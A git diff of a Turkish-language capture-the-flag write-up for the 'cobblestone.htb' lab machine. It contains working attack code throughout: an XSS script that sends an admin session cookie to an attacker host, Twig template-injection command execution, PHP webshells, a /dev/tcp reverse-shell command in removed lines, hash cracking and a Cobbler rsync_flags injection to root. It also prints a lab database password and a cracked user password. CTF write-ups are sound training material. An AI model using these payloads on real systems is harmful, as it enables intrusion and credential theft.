@@ -1,72 +1,238 @@
 ## Keşif
 
-```bash
-nmap -sCV -p- -v ip 
+### Port Taraması
 
+```bash
+nmap -sC -sV -p- --min-rate 5000 -oA full_scan ip
+```
+
+```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
 80/tcp open  http    Apache httpd 2.4.62
+```
 
+Sadece 22 ve 80 açık. HTTP'de `cobblestone.htb`'ye yönlendirme var, `/etc/hosts`'a ekledim.
 
-Host header'da cobblestone.htb vardı.
-echo "10.129.54.140 cobblestone.htb" | sudo tee -a /etc/hosts
+### Vhost Keşfi
 
-ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://FUZZ.cobblestone.htb
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -u http://cobblestone.htb/ -H "Host: FUZZ.cobblestone.htb" \
+  -fs 0 -fc 302
+```
 
-deploy.cobblestone.htb
-vote.cobblestone.htb
+İki ek vhost çıktı:
+- `vote.cobblestone.htb` — skin öneri formu
+- `deploy.cobblestone.htb` — "under development" statik sayfası
 
-echo "ip deploy.cobblestone.htb vote.cobblestone.htb" | sudo tee -a /etc/hosts
+### Web Uygulaması
 
-XSS
+`cobblestone.htb` bir skin yönetim platformu. Kayıt ol, giriş yap, skin öner gibi işlevler var. Dikkat çeken endpoint: `/suggest_skin.php`.
 
-skins.php'de kayıt olup giriş yaptım. Skin URL girişi vardı, XSS denedim. Kendi server'ıma URL verdim, bot geldi. XSS çalışıyor.
-SQL Injection
+`vote.cobblestone.htb`'de de benzer bir öneri formu mevcut. Form alanları: `username`, `name`, `url`.
 
-vote.cobblestone.htb'de SQL injection buldum. Union ile webshell yazdım.
+---
 
-' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php" -- -
+## Foothold — XSS → Admin Cookie
 
-curl http://cobblestone.htb/shell.php?cmd=id
+### XSS Tespiti
 
-curl http://cobblestone.htb/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.16.75/4444%200%3E%261%22
+`suggest_skin.php`'nin `name` alanına basit bir payload deneyin:
 
-$db_user = "dbuser";
-$db_pass = "*";
-$db_name = "*";
+```html
+<script src="http://ip:8888/xss.js"></script>
+```
 
-mysql -u dbuser -p'*' *
+Öneriyi gönderdikten ~1-2 dakika sonra Kali'deki HTTP sunucusuna istek geldi. Demek ki admin botu periyodik olarak yeni önerilere bakıyor ve `name` alanı filtrelenmemiş.
 
-SELECT username, password FROM users;
+### Admin Oturumunu Ele Geçirme
 
-* | *
+`preview_banner.php` admin-only bir endpoint. Siteye baktığımda `skins_app_admin_server_info.php` dosyasının `phpinfo()` çıktısı verdiğini fark ettim. XSS ile bu sayfayı admin botuna yükletip `PHPSESSID` cookie'sini sızdırabildim.
 
-hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+```javascript
+// xss.js
+var exfil = 'http://ip:9003';
 
-ssh *@cobblestone.htb
+fetch('/skins_app_admin_server_info.php', {credentials: 'include'})
+  .then(r => r.text())
+  .then(d => {
+    var match = d.match(/PHPSESSID[^;]*/);
+    fetch(exfil + '/?p=cookie&d=' + encodeURIComponent(match ? match[0] : d.substr(0,200)));
+  });
+```
 
-cat user.txt
+Cookie geldi: `PHPSESSID=*`
+
+Artık admin oturumu elimde, `preview_banner.php`'ye direkt POST atabiliyorum.
+
+---
+
+## User Flag — Twig SSTI → Veritabanı → cobble SSH
+
+### Twig Server-Side Template Injection
+
+`preview_banner.php` POST body'sinde `first` parametresini Twig template olarak işliyor:
+
+```php
+$first = $_POST['first'] ?? null;
+echo $twig->render('header.html.twig', ['first' => $twig->createTemplate($first)->render()]);
+```
+
+Basit test:
+
+```bash
+curl -s -b "PHPSESSID=*" \
+  -X POST 'http://cobblestone.htb/preview_banner.php' \
+  --data-urlencode "first={{7*7}}"
+# → Welcome 49
+```
+
+SSTI onaylandı. Twig sandbox yok. `|filter('system')` ile komut çalıştırabildim:
+
+```bash
+curl -s -b "PHPSESSID=..." \
+  -X POST 'http://cobblestone.htb/preview_banner.php' \
+  --data-urlencode "first={{['id']|filter('system')}}"
+# → uid=33(www-data)
+```
+
+### Veritabanı Kimlik Bilgileri
+
+SSTI ile kaynak dosyaları okuyunca `/var/www/html/db/connection.php` içinden MySQL bilgileri çıktı:
+
+```
+dbuser / aichooDeeYanaekungei9rogi0eMuo2o / cobblestone (veritabanı)
+```
+
+MySQL CLI AppArmor tarafından engellenmiş olduğundan, `skins/` dizinin (`drwxr-xrwx`) dünyaca yazılabilir olduğunu kullanarak oraya bir PHP webshell yazdım:
+
+```twig
+{{["printf '%s' '<?php include \"/var/www/html/db/connection.php\"; $r=$conn->query(\"select username,password from users\"); while($row=$r->fetch_assoc()){echo $row[\"username\"].\":\".$row[\"password\"].chr(10);}' > /var/www/html/skins/dbq.php"]|filter('system')}}
+```
+
+```bash
+curl -s http://cobblestone.htb/skins/dbq.php
+```
+
+```
+admin:*
+cobble:*
+...
+```
+
+### Hash Kırma
+
+Hashlar SHA-256. Hashcat ile:
+
+```bash
+hashcat -m 1400 cobble.hash /usr/share/wordlists/rockyou.txt
+# 20cdc5073e9...→ iluvdannymorethanyouknow
+```
+
+### SSH — User Flag
+
+```bash
+ssh cobble@cobblestone.htb
+# rbash kısıtlaması var ama cat çalışıyor
+cat ~/user.txt
+```
+
+```
 *
-rbash ile karşılaştım.
+```
 
-ssh -t *@cobblestone.htb "/bin/bash --noprofile --norc"
+---
 
-Rbash Bypass
+## Root Flag — Cobbler XMLRPC rsync Command Injection
 
-ssh -t *@cobblestone.htb "/bin/bash --noprofile --norc"
+### İç Servisleri Keşfetme
 
-ssh -L 25151:127.0.0.1:25151 *@cobblestone.htb
+SSH'a girdikten sonra açık portlara baktım:
 
-------------------------------------------------
-eklediğim exploit dosyasını kendi kalinizde nano exploit.py diyerek,
+```bash
+cat /proc/net/tcp
+```
 
-o kodu yapıştırın sonra python3 exploit.py yapmadan önce nc --lnvp 9001 portunda dinledikten sonra çalıştıırn.
+`0100007F:623F` → `127.0.0.1:25151` — Cobbler XMLRPC servisi.
 
-ondan sonra rootsunuz.
+### Port Forward
 
+```bash
+ssh -L 25152:127.0.0.1:25152 cobble@cobblestone.htb -fN
+```
+
+> **Not:** Servis aslında iki portta dinliyor. Asıl XMLRPC endpoint'i **25152** portu ve **/RPC2** path'i.
+
+### Cobbler XMLRPC Erişimi
+
+Default kimlik bilgileri çalışıyor:
+
+```python
+import xmlrpc.client
+s = xmlrpc.client.ServerProxy('http://127.0.0.1:25152/RPC2')
+t = s.login('cobbler', 'cobbler')
+print(s.version())  # → 3.306
+```
+
+### background_import — rsync_flags Command Injection
+
+Cobbler'ın `background_import` metodu, `rsync_flags` parametresini doğrudan rsync komutuna geçiriyor. Hiçbir sanitizasyon yok.
+
+Kali'de dinleyiciyi aç:
+
+```bash
+nc -lvnp 9001
+```
+
+Exploit: *writeup dosyasıyla beraber yükledim*
+
+
+Shell geldi, `root` olarak:
+
+```
+root@cobblestone:~# cat /root/root.txt
+*
+```
+
+---
+
+## Özet Diyagramı
+
+```
+[XSS - suggest_skin.php name field]
+         ↓
+[Admin bot → phpinfo cookie leak]
+         ↓
+[preview_banner.php - Twig SSTI]
+         ↓
+[www-data RCE → DB creds → PHP webshell]
+         ↓
+[cobble hash (SHA-256) → hashcat → iluvdannymorethanyouknow]
+         ↓
+[SSH cobble → user.txt]
+         ↓
+[SSH tunnel → Cobbler XMLRPC :25152/RPC2]
+         ↓
+[background_import rsync_flags injection → root shell]
+         ↓
+[root.txt]
+```
+
+---
+
+## Exploit Kodu
+
+Repo'daki `exploit.py` dosyasını kullanabilirsiniz. Çalıştırmadan önce `your_ip` kısmını kendi Kali IP'nizle değiştirin ve SSH port forward'ı kurun.
+
+```bash
+# Port forward
+ssh -L 25152:127.0.0.1:25152 cobble@cobblestone.htb -fN
+
+# Dinleyici
+nc -lvnp 9001
+
+# Exploit
+python3 exploit.py
+```
 cat /root/root.txt
-
-
-
-
-
